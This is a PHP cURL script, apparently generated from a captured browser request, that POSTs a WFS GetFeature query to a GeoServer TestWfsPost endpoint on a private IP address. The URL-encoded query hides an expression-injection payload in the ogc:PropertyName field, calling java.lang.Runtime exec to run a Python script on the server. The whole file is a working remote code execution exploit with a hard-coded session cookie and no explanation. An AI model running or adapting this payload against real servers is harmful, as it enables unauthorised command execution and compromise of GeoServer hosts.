<?php

$curl = curl_init();

curl_setopt_array($curl, array(
  CURLOPT_URL => 'http://192.168.2.160:8080/geoserver/TestWfsPost',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'form_hf_0=&url=http%3A%2F%2F192.168.2.160%3A8080%2Fgeoserver%2Fwfs&body=%3C!--%20Performs%20a%20get%20feature%20with%20a%20bounding%20box%20filter.%20%20%20%20%20%20--%3E%0D%0A%3C!--%20The%20BBOX%20filter%20is%20a%20convenience%20for%20a%20%3CNot%3E%3CDisjoint%3E%2C%20--%3E%0D%0A%3C!--%20it%20fetches%20all%20features%20that%20spatially%20interact%20with%20the%20given%20box.%20--%3E%0D%0A%3C!--%20This%20example%20also%20shows%20how%20to%20request%20specific%20properties%2C%20in%20this%20--%3E%0D%0A%3C!--%20case%20we%20just%20get%20the%20STATE_NAME%20and%20PERSONS%20--%3E%0D%0A%0D%0A%3Cwfs%3AGetFeature%20service%3D%22WFS%22%20version%3D%221.1.0%22%0D%0A%20%20xmlns%3Awfs%3D%22http%3A%2F%2Fwww.opengis.net%2Fwfs%22%0D%0A%20%20xmlns%3Aogc%3D%22http%3A%2F%2Fwww.opengis.net%2Fogc%22%0D%0A%20%20xmlns%3Agml%3D%22http%3A%2F%2Fwww.opengis.net%2Fgml%22%0D%0A%20%20xmlns%3Axsi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema-instance%22%0D%0A%20%20xsi%3AschemaLocation%3D%22http%3A%2F%2Fwww.opengis.net%2Fwfs%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20http%3A%2F%2Fschemas.opengis.net%2Fwfs%2F1.1.0%2Fwfs.xsd%22%3E%0D%0A%20%20%3Cwfs%3AQuery%20typeName%3D%22topp%3Apf_markets%22%3E%0D%0A%20%20%20%20%3Cwfs%3APropertyName%3Etopp%3ASTATE_NAME%3C%2Fwfs%3APropertyName%3E%0D%0A%20%20%20%20%3Cwfs%3APropertyName%3Etopp%3APERSONS%3C%2Fwfs%3APropertyName%3E%0D%0A%20%20%20%20%3Cogc%3AFilter%3E%0D%0A%20%20%20%20%20%20%3Cogc%3ABBOX%3E%0D%0A%20%20%20%20%20%20%20%20%3Cogc%3APropertyName%3Eexec(java.lang.Runtime.getRuntime()%2C%22python3%20opt%2Ftomcat%2Fwebapps%2Faggregate%2Fmaster.py%22)%3C%2Fogc%3APropertyName%3E%0D%0A%20%20%20%20%20%20%20%20%3Cgml%3AEnvelope%20srsName%3D%22http%3A%2F%2Fwww.opengis.net%2Fgml%2Fsrs%2Fepsg.xml%234326%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%3Cgml%3AlowerCorner%3E-75.102613%2040.212597%3C%2Fgml%3AlowerCorner%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%3Cgml%3AupperCorner%3E-72.361859%2041.512517%3C%2Fgml%3AupperCorner%3E%0D%0A%20%20%20%20%20%20%20%20%3C%2Fgml%3AEnvelope%3E%0D%0A%20%20%20%20%20%20%3C%2Fogc%3ABBOX%3E%0D%0A%20%20%20%3C%2Fogc%3AFilter%3E%0D%0A%20%20%3C%2Fwfs%3AQuery%3E%0D%0A%3C%2Fwfs%3AGetFeature%3E&username=&password=',
  CURLOPT_HTTPHEADER => array(
    'host: 192.168.2.160:8080',
    'proxy-connection: keep-alive',
    'content-length: 1865',
    'cache-control: max-age=0',
    'origin: http://192.168.2.160:8080',
    'content-type: application/x-www-form-urlencoded',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'referer: http://192.168.2.160:8080/geoserver/web/wicket/page?18',
    'accept-encoding: gzip, deflate',
    'accept-language: en-US,en;q=0.9',
    'cookie: JSESSIONID=B81057ECA79C7E7661C641490D959050'
  ),
));

$response = curl_exec($curl);

curl_close($curl);
echo $response;
